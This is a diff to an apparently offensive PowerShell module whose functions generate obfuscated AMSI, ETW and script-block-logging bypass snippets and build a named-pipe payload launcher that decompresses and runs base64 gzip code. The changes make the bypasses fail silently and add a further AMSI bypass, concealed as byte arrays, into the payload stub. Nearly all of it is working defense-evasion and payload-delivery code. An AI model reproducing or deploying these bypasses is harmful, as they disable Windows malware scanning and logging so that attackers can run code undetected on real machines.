@@ -16,7 +16,7 @@ function Get-AmsiBypassSnippet {
 
     switch ($Technique) {
         'fail' {
-            return "[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.AmsiUt'+'ils').GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue(`$null,`$true)"
+            return "try{[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.AmsiUt'+'ils').GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue(`$null,`$true)}catch{}"
         }
 
         'direct' {
@@ -56,7 +56,7 @@ function Get-EtwBypassSnippet {
 
     switch ($Technique) {
         'provider' {
-            return "[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Trac'+'ing.PSEtwLog'+'Provider').GetField('etwPro'+'vider','NonPublic,Static').GetValue(`$null)|%{[System.Diagnostics.Eventing.EventProvider].GetField('m_en'+'abled','NonPublic,Instance').SetValue(`$_,[Byte]0)}"
+            return "try{[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Trac'+'ing.PSEtwLog'+'Provider').GetField('etwPro'+'vider','NonPublic,Static').GetValue(`$null)|%{[System.Diagnostics.Eventing.EventProvider].GetField('m_en'+'abled','NonPublic,Instance').SetValue(`$_,[Byte]0)}}catch{}"
         }
 
         'patch' {
@@ -92,7 +92,7 @@ function Get-EtwBypassSnippet {
 }
 
 function Get-SblBypassSnippet {
-    return "[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Scri'+'ptBlock').GetField('checkScri'+'ptBlockLogg'+'ingCache','NonPublic,Static').SetValue(`$null,[Boolean]`$false)"
+    return "try{[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Scri'+'ptBlock').GetField('checkScri'+'ptBlockLogg'+'ingCache','NonPublic,Static').SetValue(`$null,[Boolean]`$false)}catch{}"
 }
 function New-PayloadScript {
     param(
@@ -164,7 +164,7 @@ function New-PayloadScript {
     if (-not $IsServer) {
         $pipeSetup = (
             "`$$vT=$clientType;" +
-            "`$$vPipe=New-Object -TypeName `$$vT -ArgumentList '$ComputerName','$PipeName',[System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None;" +
+            "`$$vPipe=New-Object -TypeName `$$vT -ArgumentList '$ComputerName','$PipeName','InOut';" +
             "`$$vRd=New-Object IO.StreamReader(`$$vPipe);" +
             "`$$vWr=New-Object IO.StreamWriter(`$$vPipe);" +
             "`$$vPipe.Connect(600000);" +
@@ -188,7 +188,7 @@ function New-PayloadScript {
             "`$$vAr=New-Object System.IO.Pipes.PipeAccessRule(`$$vSid,'FullControl','Allow');" +
             "`$$vSec.AddAccessRule(`$$vAr);" +
             "`$$vT=$serverType;" +
-            "`$$vPipe=New-Object -TypeName `$$vT -ArgumentList '$PipeName',[System.IO.Pipes.PipeDirection]::InOut,1,[System.IO.Pipes.PipeTransmissionMode]::Byte,[System.IO.Pipes.PipeOptions]::None,$bufSize,$bufSize,`$$vSec;" +
+            "`$$vPipe=New-Object -TypeName `$$vT -ArgumentList '$PipeName','InOut',1,'Byte','None',$bufSize,$bufSize,`$$vSec;" +
             "`$$vCb={param(`$$vTm);`$$vTm.Close()};`$$vTm=New-Object System.Threading.Timer(`$$vCb,`$$vPipe,600000,[System.Threading.Timeout]::Infinite);" +
             "`$$vPipe.WaitForConnection();" +
             "`$$vTm.Change([System.Threading.Timeout]::Infinite,[System.Threading.Timeout]::Infinite);`$$vTm.Dispose();" +
@@ -216,7 +216,7 @@ function New-PayloadScript {
     $gzs.Close()
     $b64 = [Convert]::ToBase64String($ms.ToArray())
 
-    $decomp = "`$$vGz='$b64';`$$vA=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$$vGz));`$$vB=New-Object IO.Compression.GzipStream(`$$vA,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$$vC=New-Object IO.MemoryStream;`$$vB.COpYTo(`$$vC);`$$vD=[Text.Encoding]::UTF8.GETSTrIng(`$$vC.ToArray());`$$vB.ClosE();`$$vA.ClosE();`$$vC.ClosE();[scriptblock]::Create(`$$vD).Invoke()"
+    $decomp = "`$$vGz='$b64';`$$vA=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$$vGz));`$$vB=New-Object IO.Compression.GzipStream(`$$vA,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$$vC=New-Object IO.MemoryStream;`$$vB.COpYTo(`$$vC);`$$vD=[Text.Encoding]::UTF8.GETSTrIng(`$$vC.ToArray());`$$vB.ClosE();`$$vA.ClosE();`$$vC.ClosE();try{`$_1=[System.Text.Encoding]::ASCII.GetString([byte[]](65,109,115,105,85,116,105,108,115));`$_2=[System.Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100));[Ref].Assembly.GetType([string]::Concat('System.Management.Automation.',`$_1)).GetField(`$_2,'NonPublic,Static').SetValue(`$null,`$true)}catch{};[scriptblock]::Create(`$$vD).Invoke()"
 
     return [PSCustomObject]@{
         InlinePS    = $decomp
